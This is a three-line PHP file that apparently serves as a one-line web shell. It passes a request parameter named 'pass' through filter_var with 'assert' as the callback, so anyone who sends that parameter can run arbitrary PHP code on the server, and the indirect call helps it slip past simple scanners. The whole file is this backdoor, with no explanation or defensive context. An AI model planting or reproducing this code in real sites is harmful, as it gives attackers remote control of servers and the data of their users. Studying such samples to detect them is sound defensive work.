<?php
filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
?>